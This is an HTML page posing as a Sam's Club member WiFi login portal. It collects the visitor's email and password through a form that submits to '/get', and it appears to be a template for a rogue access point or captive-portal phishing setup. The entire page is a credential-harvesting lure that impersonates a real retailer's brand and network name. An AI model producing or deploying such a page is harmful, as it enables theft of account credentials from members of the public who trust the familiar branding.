<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#00338D;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.sclogo{text-align:center;margin-bottom:20px}
.sclogo h1{font-size:28px;font-weight:900;color:#fff;letter-spacing:0.5px}
.sclogo h1 span{color:#FFC82E}
.sclogo p{font-size:11px;color:rgba(255,255,255,0.65);letter-spacing:1.5px;text-transform:uppercase;margin-top:4px}
.card{background:#fff;width:100%;max-width:420px;border-radius:16px;overflow:hidden;box-shadow:0 16px 48px rgba(0,0,0,0.25)}
.ch{background:#FFC82E;padding:18px 24px;text-align:center}
.ch h1{font-size:16px;font-weight:800;color:#00338D}.ch p{font-size:12px;color:#555;margin-top:3px}
.cb{padding:24px}
.badge{display:flex;align-items:center;gap:10px;background:#f0f5ff;border:1px solid #c0d0f0;border-radius:8px;padding:10px 13px;margin-bottom:20px}
.dot{width:8px;height:8px;background:#4ade80;border-radius:50%;flex-shrink:0;box-shadow:0 0 0 3px rgba(74,222,128,0.2)}
.badge span{font-size:12.5px;color:#666}.badge strong{color:#1a1a1a;font-weight:600}
.lbl{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.8px;color:#888;margin-bottom:6px;margin-top:14px}
input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:15px;background:#fafafa;color:#1a1a1a}
input:focus{outline:none;border-color:#00338D;box-shadow:0 0 0 3px rgba(0,51,141,0.1)}
input::placeholder{color:#c0c0c0}
.terms{font-size:11px;color:#aaa;line-height:1.5;margin-top:14px}.terms a{color:#00338D}
.btn{width:100%;padding:13px;border:none;border-radius:10px;background:#00338D;color:#fff;font-size:14px;font-weight:800;cursor:pointer;margin-top:14px}
</style>
</head>
<body>
<div class="sclogo"><h1>Sam's <span>Club</span></h1><p>Member exclusive WiFi</p></div>
<div class="card">
  <div class="ch"><h1>Sam's Club WiFi</h1><p>Member login required</p></div>
  <div class="cb">
    <div class="badge"><div class="dot"></div><span>Network: <strong>SamsClub_Member</strong></span></div>
    <form action="/get">
      <label class="lbl">Sam's Club Email</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <p class="terms">By connecting you agree to <a href="#">Sam's Club Terms</a>. Members only.</p>
      <button type="submit" class="btn">Sign In &amp; Connect</button>
    </form>
  </div>
</div>
</body>
</html>
